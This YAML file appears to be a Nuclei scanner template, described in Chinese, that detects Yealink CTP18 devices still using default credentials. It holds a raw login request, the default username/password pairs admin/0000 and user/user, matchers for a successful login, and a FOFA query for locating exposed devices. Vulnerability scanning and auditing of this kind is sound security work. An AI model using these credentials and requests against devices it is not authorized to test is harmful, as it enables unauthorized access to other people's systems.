id: yealink-default-login

info:
  name: Yealink CTP18 默认口令登录（弱口令）
  author: parzival,arbenn@pretera.com
  severity: high
  description: |
    该模板通过尝试 Yealink CTP18 的默认账号口令，并依据认证成功后的响应特征判断目标是否仍在使用未修改的弱口令。若命中，攻击者可直接登录系统，进一步访问敏感信息、修改配置或执行未授权操作。
  reference:
    - https://support.yealink.com
  metadata:
    verified: true
    max-request: 1
    fofa-query: Yealink CTP18
  tags: default-login,yealink,vuln

http:
  - raw:
      - |
        POST /api/auth/login?p=Login&t=1 HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Accept: application/json, text/plain, */*

        username={{username}}&pwd={{password}}

    attack: pitchfork
    payloads:
      username:
        - admin
        - user
      password:
        - '0000'
        - user

    host-redirects: true

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '{"ret":"ok","data":true}'
          - '{"ret":"ok","data":"ok"}'
        condition: or

      - type: word
        part: content_type
        words:
          - text/html

      - type: status
        status:
          - 200
